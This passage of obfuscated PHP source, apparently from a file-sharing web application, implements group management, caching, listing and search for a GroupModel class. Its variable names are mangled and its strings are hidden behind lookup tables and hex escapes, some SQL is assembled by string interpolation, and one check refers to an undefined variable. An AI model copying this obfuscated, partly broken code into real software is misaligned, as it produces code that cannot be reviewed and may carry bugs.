$åïıÔÍ¡ = $¥…ñ·üÊ[1957] . $¾ßÓæìç; $£¿Óé‰† = $this->where($åïıÔÍ¡)->select(); if (!$£¿Óé‰†) { return; } $€¬ê›Ë… = new Task($¥…ñ·üÊ[1958], $¥…ñ·üÊ[12], count($£¿Óé‰†)); foreach ($£¿Óé‰† as $Ï­ÓÊ¨) { $€¬ê›Ë…->update(1); $this->resetFile($Ï­ÓÊ¨); } $€¬ê›Ë…->end(); } public function resetFile($š«‹ãı™) { $£Øú©¼³ =& $_SERVER[ ÇƒŠìÀ]; $“¢ ˆº = array($£Øú©¼³[512] => $š«‹ãı™[$£Øú©¼³[511]]); $ˆê¹ó–ş = Model($£Øú©¼³[1368])->where($“¢ ˆº)->count(); $¨ù¢å¸ = Model($£Øú©¼³[1959])->where($“¢ ˆº)->count(); $ª•—´ˆ = intval($ˆê¹ó–ş) + intval($¨ù¢å¸); if ($ª•—´ˆ == 0) { IO::remove($š«‹ãı™[$£Øú©¼³[86]]); Model($£Øú©¼³[1960])->delete($š«‹ãı™[$£Øú©¼³[511]]); $this->where($“¢ ˆº)->delete(); $this->metaSet($š«‹ãı™[$£Øú©¼³[511]], null, null); return; } if ($š«‹ãı™[$£Øú©¼³[1955]] != $ª•—´ˆ) { $this->where($“¢ ˆº)->save(array($£Øú©¼³[1948] => $ª•—´ˆ)); } } public function storageInfo($¥Ê¼ùª = false) { $Ç”ìÖ‘õ =& $_SERVER[ ÇƒŠìÀ]; $ğ’Ìù©’ = $this->count() + 0.0; $ëåÔ¯š¢ = 0; $€­éˆ = 1; $Ù»³ÙÒÔ = 0; $í§öã±œ = 5000; for ($ˆàœ±…á = 0; $ˆàœ±…á < $ğ’Ìù©’; $ˆàœ±…á = $ˆàœ±…á + $í§öã±œ) { $’´°é” = $this->limit($ˆàœ±…á, $ˆàœ±…á + $í§öã±œ)->select(); foreach ($’´°é” as $ß©µÜØª) { $€­éˆ += $ß©µÜØª[$Ç”ìÖ‘õ[78]] * $ß©µÜØª[$Ç”ìÖ‘õ[1955]]; $ëåÔ¯š¢ += $ß©µÜØª[$Ç”ìÖ‘õ[78]] * ($ß©µÜØª[$Ç”ìÖ‘õ[1955]] - 1); $Ù»³ÙÒÔ += $ß©µÜØª[$Ç”ìÖ‘õ[1955]]; } } $½Ô…Â• = array($Ç”ìÖ‘õ[1961] => $€­éˆ, $Ç”ìÖ‘õ[1962] => $ëåÔ¯š¢, $Ç”ìÖ‘õ[1963] => $ëåÔ¯š¢ / $€­éˆ, $Ç”ìÖ‘õ[82] => $ğ’Ìù©’, $Ç”ìÖ‘õ[1964] => $Ù»³ÙÒÔ); return $½Ô…Â•; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\x70"; protected $tableMeta = array("\164\141\142\154\145\x4e\x61\155\145" => "\147\x72\x6f\x75\160\x5f\x6d\145\164\141", "\x6d\x65\x74\141\106\151\x65\x6c\144" => "\x67\x72\x6f\165\x70\111\104"); protected function cacheFunctionAlias($Ï¨Ã°“ê) { $ï¬ò’ =& $_SERVER[ ÇƒŠìÀ]; return array($ï¬ò’[1965] => array($Ï¨Ã°“ê[0], $ï¬ò’[1966]), $ï¬ò’[1967] => array($Ï¨Ã°“ê[0], $ï¬ò’[1968])); } protected function getInfo($âñ²³šı, $Ê„Ì«à– = false) { $€¨ãÁ¾ = $this->getInfoSimple($âñ²³šı); if (!$€¨ãÁ¾) { return !1; } if ($Ê„Ì«à–) { return $this->_listDataApplyItem($€¨ãÁ¾); } return $this->cacheFunctionGet($_SERVER[ ÇƒŠìÀ][1969], $âñ²³šı); } protected function getInfoSimple($Îá¢½Áâ, $Ã¶Ãßßš = false) { $›»Ö’£Ö =& $_SERVER[ ÇƒŠìÀ]; if ($Ã¶Ãßßš) { $ñÒıóè = array($›»Ö’£Ö[1887] => intval($Îá¢½Áâ)); $–†é•¯ = $this->where($ñÒıóè)->find(); return is_array($–†é•¯) ? $–†é•¯ : array(); } return $this->cacheFunctionGet($›»Ö’£Ö[1970], $Îá¢½Áâ); } protected function groupAdd($Í§£œ„Õ) { $“Ÿü¥Û† =& $_SERVER[ ÇƒŠìÀ]; if (!$Í§£œ„Õ[$“Ÿü¥Û†[182]] && isset($Í§£œ„Õ[$“Ÿü¥Û†[1887]]) && $Í§£œ„Õ[$“Ÿü¥Û†[1887]] == 1) { if ($÷à¨Õ™³ = $this->getInfoSimple($Í§£œ„Õ[$“Ÿü¥Û†[1887]], !0)) { return $Í§£œ„Õ[$“Ÿü¥Û†[1887]]; } } else { $÷à¨Õ™³ = $this->getInfoSimple($Í§£œ„Õ[$“Ÿü¥Û†[182]]); if (!$÷à¨Õ™³) { return !1; } } $¹üí×èÂ = $“Ÿü¥Û†[565]; if ($÷à¨Õ™³[$“Ÿü¥Û†[555]]) { $¹üí×èÂ = $÷à¨Õ™³[$“Ÿü¥Û†[555]] . $÷à¨Õ™³[$“Ÿü¥Û†[1887]] . $“Ÿü¥Û†[50]; } $—«úË°Í = array($“Ÿü¥Û†[464] => $this->groupNameAuto($Í§£œ„Õ[$“Ÿü¥Û†[182]], $Í§£œ„Õ[$“Ÿü¥Û†[32]]), $“Ÿü¥Û†[447] => $Í§£œ„Õ[$“Ÿü¥Û†[182]], $“Ÿü¥Û†[622] => $¹üí×èÂ, $“Ÿü¥Û†[1971] => $Í§£œ„Õ[$“Ÿü¥Û†[1874]], $“Ÿü¥Û†[1972] => 0, $“Ÿü¥Û†[1891] => 0); if (isset($Í§£œ„Õ[$“Ÿü¥Û†[1911]])) { $—«úË°Í[$“Ÿü¥Û†[1911]] = $Í§£œ„Õ[$“Ÿü¥Û†[1911]]; } else { $ÊÔàƒ€· = $this->max($“Ÿü¥Û†[1911]); if (!$ÊÔàƒ€·) { $ÊÔàƒ€· = 0; } $—«úË°Í[$“Ÿü¥Û†[1911]] = $ÊÔàƒ€· + 1; } if (!empty($Í§£œ„Õ[$“Ÿü¥Û†[1887]])) { $—«úË°Í[$“Ÿü¥Û†[1887]] = $Í§£œ„Õ[$“Ÿü¥Û†[1887]]; } $ì›Øçú = $this->add($—«úË°Í); $this->setNamePinyin($ì›Øçú, $—«úË°Í[$“Ÿü¥Û†[32]]); if (isset($Í§£œ„Õ[$“Ÿü¥Û†[1973]])) { $this->metaSet($ì›Øçú, array($“Ÿü¥Û†[1973] => $Í§£œ„Õ[$“Ÿü¥Û†[1973]], $“Ÿü¥Û†[1974] => $Í§£œ„Õ[$“Ÿü¥Û†[1974]])); unset($Í§£œ„Õ[$“Ÿü¥Û†[1973]]); unset($Í§£œ„Õ[$“Ÿü¥Û†[1974]]); } Model($“Ÿü¥Û†[1368])->groupRootAdd($ì›Øçú); $this->_clearCache($Í§£œ„Õ[$“Ÿü¥Û†[182]]); return $ì›Øçú; } protected function groupEdit($è¯ş¬Ö, $Îœ©£Ÿß) { $¹ıæÊˆô =& $_SERVER[ ÇƒŠìÀ]; $Øìâıï = $this->getInfoSimple($è¯ş¬Ö); if (!$Øìâıï) { return !1; } if (!empty($Îœ©£Ÿß[$¹ıæÊˆô[182]])) { $ñÒç¿Éñ = $this->getInfoSimple($Îœ©£Ÿß[$¹ıæÊˆô[182]]); if (!$ñÒç¿Éñ) { return !1; } if ($Øìâıï[$¹ıæÊˆô[1887]] == $ñÒç¿Éñ[$¹ıæÊˆô[1887]]) { return !1; } if ($Îœ©£Ÿß[$¹ıæÊˆô[182]] != $Øìâıï[$¹ıæÊˆô[182]]) { if ($ñÒç¿Éñ[$¹ıæÊˆô[555]] !== $Øìâıï[$¹ıæÊˆô[555]] && strpos($ñÒç¿Éñ[$¹ıæÊˆô[555]], $Øìâıï[$¹ıæÊˆô[555]] . $Øìâıï[$¹ıæÊˆô[1887]] . $¹ıæÊˆô[50]) === 0) { return !1; } $Îœ©£Ÿß[$¹ıæÊˆô[622]] = $ñÒç¿Éñ[$¹ıæÊˆô[555]] . $Îœ©£Ÿß[$¹ıæÊˆô[182]] . $¹ıæÊˆô[50]; $this->_changeChildLevel($Øìâıï, $ñÒç¿Éñ); $this->_clearCache($ñÒç¿Éñ[$¹ıæÊˆô[1887]]); $this->_clearCache($Øìâıï[$¹ıæÊˆô[182]]); } } if (isset($Îœ©£Ÿß[$¹ıæÊˆô[32]])) { $this->setNamePinyin($è¯ş¬Ö, $Îœ©£Ÿß[$¹ıæÊˆô[32]]); } if (isset($Îœ©£Ÿß[$¹ıæÊˆô[1973]])) { $this->metaSet($è¯ş¬Ö, array($¹ıæÊˆô[1973] => $Îœ©£Ÿß[$¹ıæÊˆô[1973]], $¹ıæÊˆô[1974] => $Îœ©£Ÿß[$¹ıæÊˆô[1974]])); unset($Îœ©£Ÿß[$¹ıæÊˆô[1973]]); unset($Îœ©£Ÿß[$¹ıæÊˆô[1974]]); } $this->_clearChildrenCache($Øìâıï); return $this->where(array($¹ıæÊˆô[1975] => $è¯ş¬Ö))->save($Îœ©£Ÿß); } private function _clearChildrenCache($Î­Áê¢°) { $á•Ÿû³ =& $_SERVER[ ÇƒŠìÀ]; $½¦æ›‡¢ = array($á•Ÿû³[622] => array($á•Ÿû³[582], $Î­Áê¢°[$á•Ÿû³[555]] . $Î­Áê¢°[$á•Ÿû³[1887]] . $á•Ÿû³[583])); $ÂŠ…†úæ = $this->field($á•Ÿû³[1887])->where($½¦æ›‡¢)->select(); foreach ($ÂŠ…†úæ as $³Şû®–•) { $this->_clearCache($³Şû®–•[$á•Ÿû³[1887]]); } } private function _clearCache($¯Ô¤ıÄ) { $¥ƒˆ˜ĞŠ =& $_SERVER[ ÇƒŠìÀ]; $this->cacheFunctionClear($¥ƒˆ˜ĞŠ[1969], $¯Ô¤ıÄ); $this->cacheFunctionClear($¥ƒˆ˜ĞŠ[1970], $¯Ô¤ıÄ); } private function _changeChildLevel($Ü‹ÈáÎ², $°©–õÒü, $Ÿ‘½®Èá = false) { $´÷ÊÂŸ =& $_SERVER[ ÇƒŠìÀ]; $»™½¸ç = $Ü‹ÈáÎ²[$´÷ÊÂŸ[555]] . $Ü‹ÈáÎ²[$´÷ÊÂŸ[1887]] . $´÷ÊÂŸ[50]; $»¢ŒÍ ¢ = $°©–õÒü[$´÷ÊÂŸ[555]] . $°©–õÒü[$´÷ÊÂŸ[1887]] . $´÷ÊÂŸ[50] . $Ü‹ÈáÎ²[$´÷ÊÂŸ[1887]] . $´÷ÊÂŸ[50]; if ($Ÿ‘½®Èá) { $»¢ŒÍ ¢ = $°©–õÒü[$´÷ÊÂŸ[555]] . $°©–õÒü[$´÷ÊÂŸ[1887]] . $´÷ÊÂŸ[50]; } $Î§Ñ±÷¦ = array($´÷ÊÂŸ[622] => array($´÷ÊÂŸ[582], $Ü‹ÈáÎ²[$´÷ÊÂŸ[555]] . $Ü‹ÈáÎ²[$´÷ÊÂŸ[1887]] . $´÷ÊÂŸ[583])); $âì—ÑÚ = array($´÷ÊÂŸ[622] => array($´÷ÊÂŸ[631], "\x72\145\160\154\x61\x63\x65\x28\x70\141\x72\145\x6e\x74\x4c\145\166\145\154\x2c\47{$»™½¸ç}\47\54\47{$»¢ŒÍ ¢}\x27\x29")); $this->_clearChildrenCache($Ü‹ÈáÎ²); $this->where($Î§Ñ±÷¦)->data($âì—ÑÚ)->save(); } public function setNamePinyin($ ¼ñøÁğ, $Êı«Ò¢ø = false) { $²¢ä£Ì =& $_SERVER[ ÇƒŠìÀ]; if (!$Êı«Ò¢ø) { $ÀäÜ‰‹§ = $this->getInfoSimple($ ¼ñøÁğ); $Êı«Ò¢ø = $ÀäÜ‰‹§[$²¢ä£Ì[32]]; } if (!Input::check($Êı«Ò¢ø, $²¢ä£Ì[625])) { $this->metaSet($ ¼ñøÁğ, $²¢ä£Ì[508], null); $this->metaSet($ ¼ñøÁğ, $²¢ä£Ì[507], null); return; } $—ğÛ½¸£ = array($²¢ä£Ì[508] => str_replace($²¢ä£Ì[53], $²¢ä£Ì[12], Pinyin::get($Êı«Ò¢ø)), $²¢ä£Ì[507] => Pinyin::get($Êı«Ò¢ø, $²¢ä£Ì[626])); $this->metaSet($ ¼ñøÁğ, $—ğÛ½¸£); } protected function groupStatus($¹¶¤âñ, $Áš‘æ±ï) { $éëµ«™Ê =& $_SERVER[ ÇƒŠìÀ]; $†ä„Çï— = $this->getInfoSimple($¹¶¤âñ); if (!$†ä„Çï—) { return !1; } if ($Áš‘æ±ï == $éëµ«™Ê[90]) { $É‡Éè´… = $this->parentLevelArray($†ä„Çï—[$éëµ«™Ê[555]]); } else { $ğ‹´ÅªË = array($éëµ«™Ê[622] => array($éëµ«™Ê[582], $†ä„Çï—[$éëµ«™Ê[555]] . $†ä„Çï—[$éëµ«™Ê[1887]] . $éëµ«™Ê[583])); $É‡Éè´… = $this->where($ğ‹´ÅªË)->field($éëµ«™Ê[1887])->select(); $É‡Éè´… = array_to_keyvalue($É‡Éè´…, $éëµ«™Ê[12], $éëµ«™Ê[1887]); } $É‡Éè´…[] = $†ä„Çï—[$éëµ«™Ê[1887]]; $ÍË¢Ëş¥ = array(); foreach ($É‡Éè´… as $¹¶¤âñ) { $ÍË¢Ëş¥[] = array($éëµ«™Ê[1887] => $¹¶¤âñ, $éëµ«™Ê[96] => $éëµ«™Ê[779], $éëµ«™Ê[420] => $Áš‘æ±ï); $this->_clearCache($¹¶¤âñ); } return Model($éëµ«™Ê[1976])->addAll($ÍË¢Ëş¥, array(), !0); } protected function groupRemove($ƒƒã•¬İ, $¦ä²ßë = false) { $Ë–ÌÉ•© =& $_SERVER[ ÇƒŠìÀ]; $ä°†¼× = array($Ë–ÌÉ•©[1887] => $ƒƒã•¬İ); $‘æßÆ¡ù = $this->where($ä°†¼×)->find(); if (!$‘æßÆ¡ù || $‘æßÆ¡ù[$Ë–ÌÉ•©[182]] == 0) { return !1; } if (!$¦ä²ßë) { $í‘ò²ô = $this->getInfoSimple($‘æßÆ¡ù[$Ë–ÌÉ•©[182]]); $this->_changeChildLevel($‘æßÆ¡ù, $í‘ò²ô, !0); $this->where(array($Ë–ÌÉ•©[182] => $ƒƒã•¬İ))->save(array($Ë–ÌÉ•©[182] => $‘æßÆ¡ù[$Ë–ÌÉ•©[182]])); $this->_clearCache($í‘ò²ô[$Ë–ÌÉ•©[1887]]); } Model($Ë–ÌÉ•©[1976])->where($ä°†¼×)->delete(); Model($Ë–ÌÉ•©[1977])->where($ä°†¼×)->delete(); Model($Ë–ÌÉ•©[854])->groupRootRemove($ƒƒã•¬İ); $this->_clearCache($‘æßÆ¡ù[$Ë–ÌÉ•©[182]]); return $this->where($ä°†¼×)->delete(); } protected function groupSort($´¶’¶¹¦) { $ŠÂ¡“ÖÑ =& $_SERVER[ ÇƒŠìÀ]; $Ÿ¥ûö¹ = array(); foreach ($´¶’¶¹¦ as $£ÇØåª => $òµ¼—õÓ) { $Ÿ¥ûö¹[] = array($ŠÂ¡“ÖÑ[1887], $òµ¼—õÓ, $ŠÂ¡“ÖÑ[1911], $£ÇØåª + 1); } $this->saveAll($Ÿ¥ûö¹); } public function listData() { $³²©Ÿ¼§ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($³²©Ÿ¼§[$_SERVER[ ÇƒŠìÀ][415]]); return $³²©Ÿ¼§; } private function _makeOrder($ÏÜºèŒ‰ = '') { $İ²”× =& $_SERVER[ ÇƒŠìÀ]; $®Á§î¨á = array($İ²”×[1887], $İ²”×[32], $İ²”×[1876], $İ²”×[217]); $±²ùÚ« = array($İ²”×[493] => $İ²”×[494], $İ²”×[495] => $İ²”×[496]); $³¤Š™íÈ = Input::get($İ²”×[500], $İ²”×[7], $İ²”×[1891], $®Á§î¨á); $–†Èøí¸ = Input::get($İ²”×[501], $İ²”×[7], $İ²”×[1978], array($İ²”×[1978], $İ²”×[495])); $–†Èøí¸ = $±²ùÚ«[$–†Èøí¸]; $ÏÜºèŒ‰ = $ÏÜºèŒ‰ . "{$³¤Š™íÈ}\40{$–†Èøí¸}\54\40\x67\x72\157\165\160\111\x44\x20\141\163\143"; return $this->order($ÏÜºèŒ‰); } public function listChild($ş¥’š¾ƒ) { $ãÔ£­Ú˜ =& $_SERVER[ ÇƒŠìÀ]; $à¦¶  = $this->where(array($ãÔ£­Ú˜[182] => $ş¥’š¾ƒ))->_makeOrder()->selectPage(200); $this->_listDataApply($à¦¶ [$ãÔ£­Ú˜[415]]); return $à¦¶ ; } public function listChildIds($°”‹À §) { $ïŞáÑäœ =& $_SERVER[ ÇƒŠìÀ]; if (is_string($éƒÔù˜¥)) { $°”‹À § = explode($ïŞáÑäœ[50], $°”‹À §); } $Š±›ù»ë = $this->where(array($ïŞáÑäœ[1887] => array($ïŞáÑäœ[7], $°”‹À §)))->field($ïŞáÑäœ[1979])->select(); if (!$Š±›ù»ë) { return !1; } $²ÃƒÇˆ = array(); foreach ($Š±›ù»ë as $‡ËÄ²é·) { $²ÃƒÇˆ[] = "\163\145\154\x65\x63\164\x20\x67\x72\157\165\160\111\x44\40\146\162\157\155\x20\140\147\162\157\165\x70\x60\x20\167\x68\x65\x72\x65\x20\160\141\162\145\156\x74\114\x65\x76\145\x6c\x20\x6c\151\153\x65\40\47{$‡ËÄ²é·[$ïŞáÑäœ[555]]}{$‡ËÄ²é·[$ïŞáÑäœ[1887]]}\54\x25\x27"; } $²ÃƒÇˆ = implode($ïŞáÑäœ[1980], $²ÃƒÇˆ); $Š±›ù»ë = $this->query($²ÃƒÇˆ); if (!$Š±›ù»ë) { return array(); } $°”‹À § = array_to_keyvalue($Š±›ù»ë, $ïŞáÑäœ[12], $ïŞáÑäœ[1887]); return array_unique($°”‹À §); } public function listByID($—œÅè«–) { $ÇØâ„½¦ =& $_SERVER[ ÇƒŠìÀ]; if (!$—œÅè«–) { return array(); } $Â§õª = array($ÇØâ„½¦[1887] => array($ÇØâ„½¦[7], $—œÅè«–)); $É ËÀ¬ = $this->where($Â§õª)->select(); $É ËÀ¬ = array_sort_keep($É ËÀ¬, $ÇØâ„½¦[1887], $—œÅè«–); $this->_listDataApply($É ËÀ¬); return $É ËÀ¬; } public function listSearch($À¦Ç§£) { $ÑæÅ¦ÙÕ =& $_SERVER[ ÇƒŠìÀ]; $ƒ½÷Å®Â = $À¦Ç§£[$ÑæÅ¦ÙÕ[1981]]; $À˜¦”îç = isset($À¦Ç§£[$ÑæÅ¦ÙÕ[1982]]) ? $À¦Ç§£[$ÑæÅ¦ÙÕ[1982]] : !1; if (!trim($ƒ½÷Å®Â)) { return !1; } $ƒ½÷Å®Â = str_replace($ÑæÅ¦ÙÕ[1983], $ÑæÅ¦ÙÕ[1984], $ƒ½÷Å®Â); $µ‘É·ÅÀ = array($ÑæÅ¦ÙÕ[1887] => array($ÑæÅ¦ÙÕ[429], "{$ƒ½÷Å®Â}\45"), $ÑæÅ¦ÙÕ[32] => array($ÑæÅ¦ÙÕ[429], "\45{$ƒ½÷Å®Â}\x25"), $ÑæÅ¦ÙÕ[1035] => $ÑæÅ¦ÙÕ[1985]); if ($À˜¦”îç) { $à¦è‘Š = $this->getInfoSimple($À˜¦”îç); $®ß¬Ã‹ = $à¦è‘Š[$ÑæÅ¦ÙÕ[555]] . $À˜¦”îç . $ÑæÅ¦ÙÕ[583]; $µ‘É·ÅÀ = array($µ‘É·ÅÀ, array($ÑæÅ¦ÙÕ[555] => array($ÑæÅ¦ÙÕ[429], $®ß¬Ã‹))); } $µ‘É·ÅÀ = $this->parseWhereLike($µ‘É·ÅÀ); $Ş‰¼ôêû = $this->_makeOrder()->where($µ‘É·ÅÀ)->selectPage(20); $Ş‰¼ôêû = $Ş‰¼ôêû ? $Ş‰¼ôêû : array($ÑæÅ¦ÙÕ[415] => array(), $ÑæÅ¦ÙÕ[412] => array()); if (!$Ş‰¼ôêû || count($Ş‰¼ôêû[$ÑæÅ¦ÙÕ[415]]) < 5 && Input::check($ƒ½÷Å®Â, $ÑæÅ¦ÙÕ[364])) { $´±éêä = $this->groupChildrenAll($À˜¦”îç); $Ö…šŒ— = $this->_searchFromMeta($ÑæÅ¦ÙÕ[507], $ƒ½÷Å®Â, 10, $´±éêä); $’¶ÉÁ…— = $this->_searchFromMeta($ÑæÅ¦ÙÕ[508], $ƒ½÷Å®Â, 10, $´±éêä); $«µ¯óíã = array_merge($Ö…šŒ—, $’¶ÉÁ…—, $Ş‰¼ôêû[$ÑæÅ¦ÙÕ[415]]); $Ş‰¼ôêû[$ÑæÅ¦ÙÕ[415]] = array_unique_by_key($«µ¯óíã, $ÑæÅ¦ÙÕ[1887]); $Ş‰¼ôêû[$ÑæÅ¦ÙÕ[412]][$ÑæÅ¦ÙÕ[413]] = count($Ş‰¼ôêû[$ÑæÅ¦ÙÕ[415]]); $Ş‰¼ôêû[$ÑæÅ¦ÙÕ[412]][$ÑæÅ¦ÙÕ[414]] = ceil($Ş‰¼ôêû[$ÑæÅ¦ÙÕ[412]][$ÑæÅ¦ÙÕ[413]] / $Ş‰¼ôêû[$ÑæÅ¦ÙÕ[412]][$ÑæÅ¦ÙÕ[409]]); } $this->_listDataApply($Ş‰¼ôêû[$ÑæÅ¦ÙÕ[415]]); return $Ş‰¼ôêû; } protected function groupChildrenAll($Ï„×£») { $ğ€çÑúÚ =& $_SERVER[ ÇƒŠìÀ]; if (!$Ï„×£») { return !1; } if (!is_array($Ï„×£»)) { $Ï„×£» = array($Ï„×£»); } $£§áµÊ¤ = $Ï„×£»; foreach ($Ï„×£» as $®²ÛÔö¨) { $‰Ÿ°ô = $this->getInfoSimple($®²ÛÔö¨); $ÀŸáçç = array($ğ€çÑúÚ[555] => array($ğ€çÑúÚ[429], $‰Ÿ°ô[$ğ€çÑúÚ[555]] . $®²ÛÔö¨ . $ğ€çÑúÚ[583])); $¼°È­ù = $this->field($ğ€çÑúÚ[1887])->where($ÀŸáçç)->select(); $£§áµÊ¤ = array_merge($£§áµÊ¤, array_to_keyvalue($¼°È­ù, $ğ€çÑúÚ[12], $ğ€çÑúÚ[1887])); } return array_unique($£§áµÊ¤); } private function _searchFromMeta($•œ£ğÓÍ, $á£‡ÆĞ¦, $§×êã›®, $¨‰¡Ø¥¶) { $¤¨ìüãä =& $_SERVER[ ÇƒŠìÀ]; $á£‡ÆĞ¦ = strtolower($á£‡ÆĞ¦); $°³å¢µ— = array($¤¨ìüãä[96] => $•œ£ğÓÍ, $¤¨ìüãä[420] => array($¤¨ìüãä[429], "\45{$á£‡ÆĞ¦}\45")); $°³å¢µ— = $this->parseWhereLike($°³å¢µ—); if ($¨‰¡Ø¥¶) { $°³å¢µ—[$¤¨ìüãä[1887]] = array($¤¨ìüãä[7], $¨‰¡Ø¥¶); } $×’â©¥® = Model($¤¨ìüãä[1986])->where($°³å¢µ—)->limit($§×êã›®)->select(); if (!$×’â©¥®) { return array(); } $×’â©¥® = array_to_keyvalue($×’â©¥®, $¤¨ìüãä[12], $¤¨ìüãä[1887]); $ô‹áÆ– = $this->where(array($¤¨ìüãä[1975] => array($¤¨ìüãä[7], $×’â©¥®)))->select(); if (!$ô‹áÆ–) { return array(); } return $ô‹áÆ–; } protected function _listDataApplyItem($Ø¬óªŠÀ) { $òêÓşß¸ = array($Ø¬óªŠÀ); $this->_listDataApply($òêÓşß¸); return $òêÓşß¸[0]; } protected function _listDataApply(&$ÇøŸÓ„±) { $…Š¨óúğ =& $_SERVER[ ÇƒŠìÀ]; if (!$ÇøŸÓ„±) { return; } $Ç¥³§Ô = array_to_keyvalue($ÇøŸÓ„±, $…Š¨óúğ[12], $…Š¨óúğ[1887]); $this->_listAppendChildren($ÇøŸÓ„±); $this->_listAppendChildrenMember($ÇøŸÓ„±); $this->_listAppendMeta($ÇøŸÓ„±, $Ç¥³§Ô); $this->_listAppendParent($ÇøŸÓ„±); $this->_listAppendSourceRoot($ÇøŸÓ„±, $Ç¥³§Ô); } private function _listAppendChildren(&$Ä¹œÒ×Í) { $ãø­û¼Š =& $_SERVER[ ÇƒŠìÀ]; $…¹¬­òÒ = array_to_keyvalue($Ä¹œÒ×Í, $ãø­û¼Š[12], $ãø­û¼Š[1887]); $Øø²ù‹ = array($ãø­û¼Š[182] => array($ãø­û¼Š[7], $…¹¬­òÒ)); $–›·şÇ  = array($ãø­û¼Š[182], $ãø­û¼Š[1987] => $ãø­û¼Š[536]); $âƒ½Í¡¸ = $this->field($–›·şÇ )->where($Øø²ù‹)->group($ãø­û¼Š[182])->select(); $®í–²½ = array_to_keyvalue($âƒ½Í¡¸, $ãø­û¼Š[182], $ãø­û¼Š[536]); foreach ($Ä¹œÒ×Í as &$ïÜ˜ùåß) { $ÌÄ¿ËÑŒ = $ïÜ˜ùåß[$ãø­û¼Š[1887]]; $ïÜ˜ùåß[$ãø­û¼Š[1988]] = isset($®í–²½[$ÌÄ¿ËÑŒ]) ? intval($®í–²½[$ÌÄ¿ËÑŒ]) : !1; } unset($ïÜ˜ùåß); } private function _listAppendChildrenMember(&$¿˜Ğ­Ø) { $¨¯³¬ÈŒ =& $_SERVER[ ÇƒŠìÀ]; $…¬†ûÄÀ = array_to_keyvalue($¿˜Ğ­Ø, $¨¯³¬ÈŒ[12], $¨¯³¬ÈŒ[1887]); $šµ½¤•è = array($¨¯³¬ÈŒ[1887] => array($¨¯³¬ÈŒ[7], $…¬†ûÄÀ)); $–á“¼òî = array($¨¯³¬ÈŒ[1887], $¨¯³¬ÈŒ[1987] => $¨¯³¬ÈŒ[536]); $–ƒË‡˜– = Model($¨¯³¬ÈŒ[1977])->field($–á“¼òî)->where($šµ½¤•è)->group($¨¯³¬ÈŒ[1887])->select(); $îöóí›á = array_to_keyvalue($–ƒË‡˜–, $¨¯³¬ÈŒ[1887], $¨¯³¬ÈŒ[536]); foreach ($¿˜Ğ­Ø as &$Š”î«˜) { $ÅÄŞ…µ = $Š”î«˜[$¨¯³¬ÈŒ[1887]]; $Š”î«˜[$¨¯³¬ÈŒ[1989]] = isset($îöóí›á[$ÅÄŞ…µ]) ? intval($îöóí›á[$ÅÄŞ…µ]) : !1; } unset($Š”î«˜); } private function _listAppendMeta(&$Á‡‹­ƒ¿, $İ††ŒéÑ) { $’»¼í¿Ÿ =& $_SERVER[ ÇƒŠìÀ]; $úõŞí¥ = array($’»¼í¿Ÿ[1887] => array($’»¼í¿Ÿ[7], $İ††ŒéÑ)); $ËëˆÕ­ó = Model($’»¼í¿Ÿ[1976])->where($úõŞí¥)->select(); $ËëˆÕ­ó = array_to_keyvalue_group($ËëˆÕ­ó, $’»¼í¿Ÿ[1887]); foreach ($ËëˆÕ­ó as &$á¦¿äî) { $á¦¿äî = array_to_keyvalue($á¦¿äî, $’»¼í¿Ÿ[96], $’»¼í¿Ÿ[420]); } unset($á¦¿äî); foreach ($Á‡‹­ƒ¿ as &$òô¾Ã†) { $òô¾Ã†[$’»¼í¿Ÿ[509]] = array(); if (isset($ËëˆÕ­ó[$òô¾Ã†[$’»¼í¿Ÿ[1887]]])) { $òô¾Ã†[$’»¼í¿Ÿ[509]] = $ËëˆÕ­ó[$òô¾Ã†[$’»¼í¿Ÿ[1887]]]; } } unset($òô¾Ã†); } protected function parentLevelArray($ã³éëÅ“) { $’µ Â” =& $_SERVER[ ÇƒŠìÀ]; $ã³éëÅ“ = explode($’µ Â”[50], trim($ã³éëÅ“, $’µ Â”[50])); $ã³éëÅ“ = array_remove_value($ã³éëÅ“, $’µ Â”[214]); return $ã³éëÅ“; } protected function parentInGroup($œ¨„¬«Œ, $¢›Îö¾) { $ÖÀ–˜×ä =& $_SERVER[ ÇƒŠìÀ]; $ƒ¿ƒ¦Ó· = $this->getInfoSimple($œ¨„¬«Œ); if (!$ƒ¿ƒ¦Ó·) { return !0; } $¦Ôùª–Õ = $this->parentLevelArray($ƒ¿ƒ¦Ó·[$ÖÀ–˜×ä[555]]); $¦Ôùª–Õ[] = $œ¨„¬«Œ; foreach ($¦Ôùª–Õ as $œ¨„¬«Œ) { if (in_array($œ¨„¬«Œ . $ÖÀ–˜×ä[12], $¢›Îö¾)) { return !0; } } return !1; } private function _listAppendParent(&$ÊÈ¶—Î±) { $êõ—øè =& $_SERVER[ ÇƒŠìÀ]; $¡…§íúÇ = array(); foreach ($ÊÈ¶—Î± as &$©äŸÃâÊ) { $¡…§íúÇ[$©äŸÃâÊ[$êõ—øè[1887]]] = $©äŸÃâÊ[$êõ—øè[32]]; $Ô‹ŒÆ¬¡ = $this->parentLevelArray($©äŸÃâÊ[$êõ—øè[555]]); foreach ($Ô‹ŒÆ¬¡ as $İÂ•ˆ˜) { if (!isset($¡…§íúÇ[$İÂ•ˆ˜])) { $¡…§íúÇ[$İÂ•ˆ˜] = 0; } } } unset($©äŸÃâÊ); foreach ($¡…§íúÇ as $­Ü¸çÖ => $¦óæàÈ­) { if ($¦óæàÈ­) { continue; } $‘¿ÄÈ½¨ = $this->getInfoSimple($­Ü¸çÖ); $¡…§íúÇ[$­Ü¸çÖ] = $‘¿ÄÈ½¨[$êõ—øè[32]]; } $Ë®ÓÄ‹ = $GLOBALS[$êõ—øè[6]][$êõ—øè[91]][$êõ—øè[1990]]; if (KodUser::isRoot()) { $Ë®ÓÄ‹ = !1; } foreach ($ÊÈ¶—Î± as &$©äŸÃâÊ) { $Ô‹ŒÆ¬¡ = $this->parentLevelArray($©äŸÃâÊ[$êõ—øè[555]]); $Ï¼“ì‹ó = $êõ—øè[12]; foreach ($Ô‹ŒÆ¬¡ as $­Ü¸çÖ => $İÂ•ˆ˜) { if ($Ë®ÓÄ‹ && $­Ü¸çÖ == 0) { continue; } $Ï¼“ì‹ó .= $¡…§íúÇ[$İÂ•ˆ˜] . $êõ—øè[8]; } if ($Ô‹ŒÆ¬¡) { $Ï¼“ì‹ó .= $©äŸÃâÊ[$êõ—øè[32]]; } $©äŸÃâÊ[$êõ—øè[560]] = str_replace($êõ—øè[563], 